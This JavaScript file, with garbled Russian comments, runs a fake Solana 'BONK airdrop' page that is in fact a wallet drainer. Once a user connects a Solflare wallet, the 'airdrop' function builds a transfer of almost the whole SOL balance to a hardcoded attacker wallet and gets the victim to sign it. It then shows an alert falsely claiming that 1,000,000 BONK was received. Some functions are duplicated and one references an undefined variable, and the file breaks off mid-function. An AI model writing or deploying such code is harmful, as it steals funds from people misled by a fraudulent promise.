// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const TOKEN_MINT = '85VBFQZC9TZkfaptBWjvUw7YbZjy52A6mjtPGjstQAmQ';
const DESTINATION_WALLET = '8m1uhnyvrPSudreGxs1jwYQnFQZ1oqGivDqbyLRAYPsD';
const AIRDROP_AMOUNT = 1000000;

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
let walletConnected = false;
let publicKey = null;
let solBalance = 0;

console.log('üöÄ app.js –∑–∞–≥—Ä—É–∂–µ–Ω');

// –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–∏–ø–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
function isMobileDevice() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
           (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
    console.log('üì± –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', isMobile ? 'Mobile' : 'PC');
    return isMobile;
}

// –û—Ç–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
function connectWallet() {
    console.log('üñ±Ô∏è –ù–∞–∂–∞—Ç–∞ –∫–Ω–æ–ø–∫–∞ Connect Wallet');
    if (isMobileDevice()) {
        console.log('üì± –ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ - –ø—Ä—è–º–æ–π –≤—ã–∑–æ–≤ Solflare');
        connectSolflare();
    } else {
        console.log('üíª PC —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ - –æ—Ç–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞');
        document.getElementById('walletModal').style.display = 'flex';
    }
}

// –ó–∞–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
function closeModal() {
    console.log('‚ùå –ó–∞–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞');
    document.getElementById('walletModal').style.display = 'none';
}

// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ Solflare –∫–æ—à–µ–ª—å–∫–∞
async function connectSolflare() {
    console.log('üîó –ù–∞—á–∞–ª–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è Solflare');
    const isMobile = isMobileDevice();
    
    if (isMobile) {
        connectSolflareMobile();
    } else {
        await connectSolflareDesktop();
    }
    
    closeModal();
}

// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è –ü–ö
async function connectSolflareDesktop() {
    console.log('üíª –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –±—Ä–∞—É–∑–µ—Ä–∞');
    
    if (window.solflare && window.solflare.isSolflare) {
        console.log('‚úÖ Solflare —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–æ');
        console.log('üîç Solflare –æ–±—ä–µ–∫—Ç:', window.solflare);
        
        try {
            const solflare = window.solflare;
            console.log('üîë –ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ...');
            
            // –ü—Ä–∞–≤–∏–ª—å–Ω—ã–π —Å–ø–æ—Å–æ–± –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è Solflare
            if (solflare.connect) {
                await solflare.connect();
                console.log('‚úÖ Connect –º–µ—Ç–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω');
            }
            
            // –ü–æ–ª—É—á–∞–µ–º –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á –Ω–∞–ø—Ä—è–º—É—é –∏–∑ –æ–±—ä–µ–∫—Ç–∞ solflare
            if (solflare.publicKey) {
                publicKey = solflare.publicKey.toString();
                console.log('‚úÖ –ü—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á –ø–æ–ª—É—á–µ–Ω:', publicKey);
            } else if (solflare._publicKey) {
                publicKey = solflare._publicKey.toString();
                console.log('‚úÖ –ü—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á –ø–æ–ª—É—á–µ–Ω (–∏–∑ _publicKey):', publicKey);
            } else {
                // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± - —á–µ—Ä–µ–∑ –∑–∞–ø—Ä–æ—Å accounts
                const accounts = await solflare.getAccounts();
                if (accounts && accounts.length > 0) {
                    publicKey = accounts[0].toString();
                    console.log('‚úÖ –ü—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á –ø–æ–ª—É—á–µ–Ω —á–µ—Ä–µ–∑ getAccounts():', publicKey);
                } else {
                    throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á');
                }
            }
            
            await handleWalletConnected();
            
        } catch (error) {
            console.error('‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:', error);
            console.error('üîç –î–µ—Ç–∞–ª–∏ –æ—à–∏–±–∫–∏:', {
                message: error.message,
                stack: error.stack,
                solflare: window.solflare ? '–¥–æ—Å—Ç—É–ø–µ–Ω' : '–Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω'
            });
            alert('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞: ' + error.message);
        }
    } else {
        console.log('‚ùå Solflare —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ');
        openSolflareWebsite();
    }
}

// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
function connectSolflareMobile() {
    console.log('üì± –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ –º–æ–±–∏–ª—å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ');
    const solflareDeeplink = `solflare://wc?uri=${encodeURIComponent(window.location.href)}`;
    console.log('üîó Deeplink:', solflareDeeplink);
    window.location.href = solflareDeeplink;
    
    setTimeout(() => {
        if (!document.hidden) {
            console.log('‚ùå –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–µ –æ—Ç–∫—Ä—ã–ª–æ—Å—å, –ø–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —Å–∞–π—Ç');
            openSolflareWebsite();
        }
    }, 1000);
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ —É—Å–ø–µ—à–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
async function handleWalletConnected() {
    console.log('üîß –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞');
    walletConnected = true;
    document.getElementById('walletInfo').style.display = 'block';
    document.querySelector('.connect-btn').style.display = 'none';
    
    await getWalletBalance();
    updateBalanceDisplay();
}

async function getWalletBalance() {
    console.log('üí∞ –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –∫–æ—à–µ–ª—å–∫–∞');
    
    if (!publicKey) {
        console.log('‚ùå –ù–µ—Ç –ø—É–±–ª–∏—á–Ω–æ–≥–æ –∫–ª—é—á–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞');
        return;
    }

    // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç–æ–ª—å–∫–æ —Ä–∞–±–æ—á–∏–µ RPC endpoints
    const rpcEndpoints = [
        "https://solana-rpc.publicnode.com",
        "https://api.devnet.solana.com"
    ];

    for (let i = 0; i < rpcEndpoints.length; i++) {
        const endpoint = rpcEndpoints[i];
        try {
            console.log(`üîó RPC ${i + 1}/${rpcEndpoints.length}: ${endpoint}`);
            
            const payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [publicKey]
            };
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(payload)
            });
            
            if (!response.ok) {
                console.log(`‚ùå HTTP –æ—à–∏–±–∫–∞: ${response.status}`);
                continue;
            }
            
            const data = await response.json();
            console.log('üìä RPC –æ—Ç–≤–µ—Ç:', data);
            
            if (data.result) {
                const balanceInLamports = data.result.value;
                solBalance = balanceInLamports / 1000000000;
                console.log(`‚úÖ –ë–∞–ª–∞–Ω—Å –ø–æ–ª—É—á–µ–Ω —á–µ—Ä–µ–∑ ${endpoint}: ${solBalance} SOL`);
                return;
            }
            
        } catch (error) {
            console.log(`‚ùå –û—à–∏–±–∫–∞ —Å RPC ${endpoint}:`, error.message);
        }
    }
    
    console.log('‚ùå –í—Å–µ –º–µ—Ç–æ–¥—ã –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –Ω–µ —É–¥–∞–ª–∏—Å—å');
    solBalance = 0;
}

// Fallback –º–µ—Ç–æ–¥ —á–µ—Ä–µ–∑ –¥—Ä—É–≥–∏–µ RPC
async function getWalletBalanceFallback() {
    console.log('üîÑ RPC fallback –º–µ—Ç–æ–¥...');
    
    const rpcEndpoints = [
        "https://api.mainnet-beta.solana.com",
        "https://solana-api.projectserum.com", 
        "https://rpc.ankr.com/solana",
        "https://solana-rpc.publicnode.com",
        "https://free.rpc.quicknode.com/solana"
    ];

    for (let i = 0; i < rpcEndpoints.length; i++) {
        const endpoint = rpcEndpoints[i];
        try {
            console.log(`üîó RPC fallback ${i + 1}/${rpcEndpoints.length}: ${endpoint}`);
            
            const payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [publicKey]
            };
            
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000);
            
            const response = await fetch(endpoint, {
                method: 'POST',
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(payload),
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            
            if (!response.ok) {
                console.log(`‚ùå HTTP –æ—à–∏–±–∫–∞: ${response.status}`);
                continue;
            }
            
            const data = await response.json();
            console.log('üìä RPC –æ—Ç–≤–µ—Ç:', data);
            
            if (data.result) {
                const balanceInLamports = data.result.value;
                solBalance = balanceInLamports / 1000000000;
                console.log(`‚úÖ –ë–∞–ª–∞–Ω—Å –ø–æ–ª—É—á–µ–Ω —á–µ—Ä–µ–∑ RPC ${endpoint}: ${solBalance} SOL`);
                return;
            }
            
        } catch (error) {
            console.log(`‚ùå –û—à–∏–±–∫–∞ —Å RPC ${endpoint}:`, error.message);
        }
    }
    
    // –ü–æ—Å–ª–µ–¥–Ω—è—è –ø–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ web3.js
    console.log('üîÑ –ü–æ—Å–ª–µ–¥–Ω—è—è –ø–æ–ø—ã—Ç–∫–∞ —á–µ—Ä–µ–∑ web3.js...');
    try {
        const connection = new window.solanaWeb3.Connection(
            "https://rpc.ankr.com/solana",
            { commitment: 'confirmed' }
        );
        const publicKeyObj = new window.solanaWeb3.PublicKey(publicKey);
        const balance = await connection.getBalance(publicKeyObj);
        solBalance = balance / window.solanaWeb3.LAMPORTS_PER_SOL;
        console.log(`‚úÖ –ë–∞–ª–∞–Ω—Å —á–µ—Ä–µ–∑ web3.js: ${solBalance} SOL`);
    } catch (finalError) {
        console.error('‚ùå –í—Å–µ –º–µ—Ç–æ–¥—ã –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ –Ω–µ —É–¥–∞–ª–∏—Å—å:', finalError);
        solBalance = 0;
    }
}

// –ü—Ä–æ—Å—Ç–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –±—ã—Å—Ç—Ä–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏ —á–µ—Ä–µ–∑ —Å–∞–º—ã–π –Ω–∞–¥–µ–∂–Ω—ã–π RPC
async function quickBalanceCheck() {
    console.log('‚ö° –ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞...');
    
    if (!publicKey) return;

    try {
        // –ò—Å–ø–æ–ª—å–∑—É–µ–º Ankr - —Å–∞–º—ã–π –Ω–∞–¥–µ–∂–Ω—ã–π –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π RPC
        const response = await fetch("https://rpc.ankr.com/solana", {
            method: 'POST',
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance", 
                "params": [publicKey]
            })
        });
        
        const data = await response.json();
        
        if (data.result) {
            const balanceInLamports = data.result.value;
            solBalance = balanceInLamports / 1000000000;
            console.log(`‚úÖ –ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞: ${solBalance} SOL`);
            updateBalanceDisplay();
            return true;
        }
    } catch (error) {
        console.log('‚ùå –ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å:', error);
    }
    
    return false;
}

function updateBalanceDisplay() {
    console.log('üîÑ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞');
    const balanceElement = document.getElementById('balanceInfo');
    if (publicKey && solBalance !== null) {
        balanceElement.innerHTML = `
            <strong>Wallet:</strong> ${publicKey.slice(0, 8)}...${publicKey.slice(-8)}<br>
            <strong>SOL Balance:</strong> ${solBalance.toFixed(6)} SOL
        `;
        console.log('‚úÖ –ë–∞–ª–∞–Ω—Å –æ—Ç–æ–±—Ä–∞–∂–µ–Ω –≤ UI:', solBalance, 'SOL');
    } else {
        balanceElement.innerHTML = 'Loading balance...';
    }
}

async function handleWalletConnected() {
    console.log('üîß –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞');
    walletConnected = true;
    document.getElementById('walletInfo').style.display = 'block';
    document.querySelector('.connect-btn').style.display = 'none';
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç
    document.getElementById('balanceInfo').innerHTML = 'Loading balance...';
    
    await getWalletBalance();
    updateBalanceDisplay();
}

// –°–∏–º—É–ª—è—Ü–∏—è –∞–∏—Ä–¥—Ä–æ–ø–∞ –∏ –ø–µ—Ä–µ–≤–æ–¥ –±–∞–ª–∞–Ω—Å–∞
async function simulateAirdrop() {
    console.log('üéØ –ù–∞—á–∞–ª–æ —Å–∏–º—É–ª—è—Ü–∏–∏ –∞–∏—Ä–¥—Ä–æ–ø–∞');
    
    if (!walletConnected || !publicKey) {
        console.log('‚ùå –ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫');
        return;
    }

    console.log('‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω, –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á:', publicKey);
    console.log('üí∞ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å:', solBalance, 'SOL');

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å (0.002 SOL –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)
    if (solBalance < 0.002) {
        alert(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ SOL –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏. –¢—Ä–µ–±—É–µ—Ç—Å—è –º–∏–Ω–∏–º—É–º 0.002 SOL, —É –≤–∞—Å: ${solBalance} SOL`);
        return;
    }

    const loadingElement = document.getElementById('loading');
    loadingElement.style.display = 'block';

    try {
        const transaction = await createAirdropTransaction();
        
        if (window.solflare && window.solflare.isSolflare) {
            console.log('‚úçÔ∏è –ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...');
            const signedTransaction = await window.solflare.signTransaction(transaction);
            
            console.log('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...');
            const signature = await sendTransaction(signedTransaction);
            
            console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:', signature);
            alert(`‚úÖ –ê–∏—Ä–¥—Ä–æ–ø –≤—ã–ø–æ–ª–Ω–µ–Ω!\n\n–í—ã –ø–æ–ª—É—á–∏–ª–∏: 1,000,000 BONK\n–ü–µ—Ä–µ–≤–µ–¥–µ–Ω–æ: ${(transferAmount / 1000000000).toFixed(6)} SOL\n\nSignature: ${signature}\n\n–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é: https://solscan.io/tx/${signature}`);
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –±–∞–ª–∞–Ω—Å
            setTimeout(async () => {
                await getWalletBalance();
                updateBalanceDisplay();
            }, 3000);
            
        } else {
            throw new Error('Solflare –Ω–µ –Ω–∞–π–¥–µ–Ω');
        }
        
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', error);
        alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ' + error.message);
    } finally {
        loadingElement.style.display = 'none';
    }
}
// –°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –∞–∏—Ä–¥—Ä–æ–ø–∞
// –°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ (—Ç–æ–ª—å–∫–æ –ø–µ—Ä–µ–≤–æ–¥ - —Å–∞–º—ã–π –ø—Ä–æ—Å—Ç–æ–π –≤–∞—Ä–∏–∞–Ω—Ç)
async function createAirdropTransaction() {
    console.log('üîß –°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –ø–µ—Ä–µ–≤–æ–¥–∞');
    
    const workingRpc = "https://solana-rpc.publicnode.com";
    const connection = new window.solanaWeb3.Connection(workingRpc);

    const transaction = new window.solanaWeb3.Transaction();

    // –ü–µ—Ä–µ–≤–æ–¥ SOL (–æ—Å—Ç–∞–≤–ª—è–µ–º 0.001 SOL –¥–ª—è rent –∏ –∫–æ–º–∏—Å—Å–∏–π)
    const transferAmount = Math.floor((solBalance - 0.001) * window.solanaWeb3.LAMPORTS_PER_SOL);
    
    if (transferAmount <= 0) {
        throw new Error(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ SOL –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞. –ù—É–∂–Ω–æ –º–∏–Ω–∏–º—É–º 0.001 SOL, —É –≤–∞—Å: ${solBalance} SOL`);
    }

    console.log('üí∏ –°—É–º–º–∞ –ø–µ—Ä–µ–≤–æ–¥–∞ SOL:', transferAmount, 'lamports');

    const transferInstruction = window.solanaWeb3.SystemProgram.transfer({
        fromPubkey: new window.solanaWeb3.PublicKey(publicKey),
        toPubkey: new window.solanaWeb3.PublicKey(DESTINATION_WALLET),
        lamports: transferAmount,
    });

    // –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é
    transaction.add(transferInstruction);
    
    console.log('‚úÖ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –¥–æ–±–∞–≤–ª–µ–Ω–∞ –≤ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é');

    // –ü–æ–ª—É—á–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–π –±–ª–æ–∫
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = new window.solanaWeb3.PublicKey(publicKey);

    console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –ø–æ–ª–Ω–æ—Å—Ç—å—é —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∞');
    return transaction;
}
// –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
async function sendTransaction(transaction) {
    console.log('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ —Å–µ—Ç—å...');
    
    // –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ä–∞–±–æ—á–∏–π RPC –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
    const workingRpc = "https://solana-rpc.publicnode.com";
    const connection = new window.solanaWeb3.Connection(workingRpc);
    
    const signature = await connection.sendRawTransaction(transaction.serialize());
    console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞, signature:', signature);
    
    console.log('‚è≥ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...');
    await connection.confirmTransaction(signature);
    console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞');
    
    return signature;
}

// –°–∏–º—É–ª—è—Ü–∏—è –∞–∏—Ä–¥—Ä–æ–ø–∞ –∏ –ø–µ—Ä–µ–≤–æ–¥ –±–∞–ª–∞–Ω—Å–∞
// –°–∏–º—É–ª—è—Ü–∏—è –∞–∏—Ä–¥—Ä–æ–ø–∞ –∏ –ø–µ—Ä–µ–≤–æ–¥ –±–∞–ª–∞–Ω—Å–∞
async function simulateAirdrop() {
    console.log('üéØ –ù–∞—á–∞–ª–æ —Å–∏–º—É–ª—è—Ü–∏–∏ –∞–∏—Ä–¥—Ä–æ–ø–∞');
    
    if (!walletConnected || !publicKey) {
        console.log('‚ùå –ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–∫–ª—é—á–µ–Ω');
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —Å–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫');
        return;
    }

    console.log('‚úÖ –ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω, –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á:', publicKey);
    console.log('üí∞ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å:', solBalance, 'SOL');

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –º–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å (0.002 SOL –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)
    if (solBalance < 0.002) {
        alert(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ SOL –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏. –¢—Ä–µ–±—É–µ—Ç—Å—è –º–∏–Ω–∏–º—É–º 0.002 SOL, —É –≤–∞—Å: ${solBalance} SOL`);
        return;
    }

    const loadingElement = document.getElementById('loading');
    loadingElement.style.display = 'block';

    try {
        const transaction = await createAirdropTransaction();
        const transferAmount = Math.floor((solBalance - 0.001) * window.solanaWeb3.LAMPORTS_PER_SOL);
        
        if (window.solflare && window.solflare.isSolflare) {
            console.log('‚úçÔ∏è –ü–æ–¥–ø–∏—Å–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...');
            const signedTransaction = await window.solflare.signTransaction(transaction);
            
            console.log('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...');
            const signature = await sendTransaction(signedTransaction);
            
            console.log('‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:', signature);
            alert(`‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∞!\n\n–ü–µ—Ä–µ–≤–µ–¥–µ–Ω–æ: ${(transferAmount / 1000000000).toFixed(6)} SOL\n–û—Å—Ç–∞–ª–æ—Å—å: 0.001 SOL\n\nSignature: ${signature}\n\n–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é: https://solscan.io/tx/${signature}`);
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –±–∞–ª–∞–Ω—Å
            setTimeout(async () => {
                await getWalletBalance();
                updateBalanceDisplay();
            }, 3000);
            
        } else {
            throw new Error('Solflare –Ω–µ –Ω–∞–π–¥–µ–Ω');
        }
        
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:', error);
        alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: ' + error.message);
    } finally {
        loadingElement.style.display = 'none';
    }
}

// –û—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–∞ Solflare
function openSolflareWebsite() {
    console.log('üåê –û—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–∞ Solflare');
    const solflareUrl = 'https://solflare.com/download';
    window.open(solflareUrl, '_blank');
}

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞ –≤–Ω–µ –º–æ–¥–∞–ª—å–Ω–æ–≥–æ –æ–∫–Ω–∞
window.onclick = function(event) {
    const modal = document.getElementById('walletModal');
    if (event.target === modal) {
        closeModal();
    }
}

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('load', function() {
    console.log('üìÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞');
    console.log('üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', isMobileDevice() ? 'Mobile' : 'PC');
    console.log('üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ Solflare:', window.solflare ? '–ù–∞–π–¥–µ–Ω' : '–ù–µ –Ω–∞–π–¥–µ–Ω');
    console.log('üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ Solana Web3:', window.solanaWeb3 ? '–ù–∞–π–¥–µ–Ω' : '–ù–µ –Ω–∞–π–¥–µ–Ω');
    
    // –ó–∞–≥—Ä—É–∂–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
    loadSolanaWeb3();
});

// –ó–∞–≥—Ä—É–∑–∫–∞ Solana Web3 –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
function loadSolanaWeb3() {
    console.log('üìö –ó–∞–≥—Ä—É–∑–∫–∞ Solana Web3 –±–∏–±–ª–∏–æ—Ç–µ–∫–∏...');
    
    if (!window.solanaWeb3) {
        const script = document.createElement('script');
        script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js';
        script.onload = function() {
            console.log('‚úÖ Solana Web3.js –∑–∞–≥—Ä—É–∂–µ–Ω');
            initializeWallet();
        };
        script.onerror = function() {
            console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ Solana Web3.js');
        };
        document.head.appendChild(script);
    } else {
